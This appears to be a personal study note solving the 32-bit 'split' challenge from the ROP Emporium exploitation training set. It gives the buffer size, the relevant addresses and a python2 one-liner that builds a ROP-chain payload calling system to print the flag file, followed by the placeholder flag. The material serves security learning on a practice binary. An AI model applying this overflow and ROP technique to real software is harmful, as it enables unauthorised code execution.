Links [[00 - Global Index (Start Here!)]] [[ROP Emporium]]

# [[split]]
### Contents
***
- [Task Description](02%20-%20split.md#Task%20Description)
- [32 bit](02%20-%20split.md#32%20bit)

### Task Description
***
The elements that allowed you to complete ret2win are still present, they've just been split apart.  
Find them and recombine them using a short ROP chain.

### 32 bit
***
File Checks
32 bit ELF with no canaries
To get the flag we need to create a chain where it first calls system and then /bin/cat flag.txt
/bin/cat flag.txt has a memory addr of 0x804a030
and for the system call it is 0x0804861a
The buffer size is 44 bytes

Generate the payload
```bash
python2 -c 'print "A"*44 +"\x1a\x86\x04\x08"+"\x30\xa0\x04\x08"' > payload
```

Then pass it in and get the flag
```flag
ROPE{a_placeholder_32byte_flag!}
```


---
Creation date: 11-10-2022
Last modified date: Tuesday 11th October 2022
***
